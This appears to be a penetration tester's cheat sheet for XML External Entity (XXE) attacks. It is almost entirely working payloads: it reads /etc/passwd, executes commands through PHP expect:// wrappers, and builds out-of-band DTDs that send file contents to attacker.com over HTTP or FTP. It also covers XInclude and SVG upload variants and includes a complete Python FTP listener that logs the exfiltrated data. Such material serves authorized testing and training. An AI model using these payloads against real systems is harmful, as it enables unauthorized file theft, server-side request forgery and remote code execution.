- [ ] Test with Collaborator using direct reference and parameter entities
- [ ] OAST DTD -> exfiltrate
	- [ ] Error messages
	- [ ] FTP exfiltration
- [ ] SVG image upload
- [ ] XInclude
- [ ] If PHP attempt RCE and PHP wrappers
- [ ] SSRF with XXE
XXE File Read
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
XXE File Read PHP Wrappers
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
RCE PHP Wrappers
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "expect://id"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### DTD Blind XXE
- Multi-line data exfiltration over HTTP can lead to parsing errors making it not possible to exfiltrate data from files -> Use FTP exfiltration.
- HTTP method is only for single-line file data exfiltration -> test with /etc/hostname
OAST detection
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
```
OAST detection parameter entities
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY % xxe SYSTEM "http://attacker.com/"> 
%xxe;]>
```
(PHP) OAST File Read (xxe.dtd)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://attacker.com/?content=%file;'>">
```
OAST File Read payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<stockCheck><productId>&content;</productId></stockCheck>
```
(PHP) OAST File Read parameter entity
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://attacker.com/?content=%file;'>">
```
OAST File Read payload parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
  %content;
]>
```
Alternative: OAST File Read (xxe.dtd)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://attacker.com/?content=%file;'>">
%oob;
%content;
```
Alternative: File Read Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
]>
```
OAST Error File Read (xxe.dtd)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```
### FTP DTD Exfiltration
- For multi-line file data exfiltration
OAST File Read parameter entity
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'ftp://attacker.com/%file;'>">
%oob;
%content;
```
OAST File Read Payload parameter entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
]>
```
FTP server
Credit: https://medium.com/@p0lyxena/exploiting-a-difficult-out-of-band-xxe-via-ftp-connections-c8506f799e8b
```python
import socket  
import sys  
import argparse  
  
name = """  
=--------------------------------------=  
|  230 OOB || an Out-Of-Band XXE tool  |  
|    ____  _____  ___   ___  ____      |  
|   (___ \(__  / / _ \ / _ \|  _ \     |  
|     __) ) / / | | | | | | | |_) )    |  
|    / __/ (__ \| | | | | | |  _ (     |  
|   | |___ ___) ) |_| | |_| | |_) )    |m  
|   |_____|____/ \___/ \___/|____/     |  
|          by Corben Leo           |  
|                                      |  
|      - https://www.corben.io         |  
|      - https://hackerone.com/cdl     |  
|      - https://twitter.com/hacker_   |  
=--------------------------------------=  
"""  
  
print(name)  
  
# Setting up the FTP server  
parser = argparse.ArgumentParser(description='An Out-of-Band XXE tool by Corben Leo')  
args = parser.parse_args()  
  
HOST = '192.168.1.2'  
PORT = 21  
  
welcome = b'220 oob-xxe\n'  
ftp_catch_all_response = b'230 more data please!\n'  
ftp_user_response = b'331 hello world!\n'  
ftp_pass_response = b'230 my password is also hunter2!\n'  
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
  
def main():  
    try:  
        s.bind((HOST, PORT))  
    except socket.error as msg:  
        print('[+] ERROR: Bind failed. ')  
        sys.exit()  
  
    s.listen(10)  
    print('[+] 230OOB started on port: '+str(PORT))  
  
    conn, addr = s.accept()  
    print('[*] Connection from: '+addr[0]+"!")  
    conn.sendall(welcome)  
  
    while True:  
        data = conn.recv(1024)  
        ftp_command = data.split(b" ", 1)  
        response = {  
            'user': ftp_user_response,  
            'pass': ftp_pass_response,  
        }.get(ftp_command[0].lower(), ftp_catch_all_response)  
        conn.sendall(response)  
        line = data.decode('UTF-8')  
        line = line.replace("\n","").replace("CWD","")  
        print(line)  
        extract(line)  
    s.close()  
  
def extract(data):  
        fopen = open('./extracted.log', 'a')  
        fopen.write(data)  
        fopen.close()  
  
try:  
    main()  
except KeyboardInterrupt:  
    s.close()
```
### XInclude
Payload for file read, found server-side XML parsing
- Used when XML parsing is not done.
```XML
<foo+xmlns:xi="http://www.w3.org/2001/XInclude">+<xi:include+parse="text"+href="file:///etc/passwd"/></foo>
```
### SVG XXE
Xinclude
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
XML
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">
		&xxe;
	</text>
</svg>
```
OAST XML
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE product [ 
<!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">
		&xxe;
	</text>
</svg>
```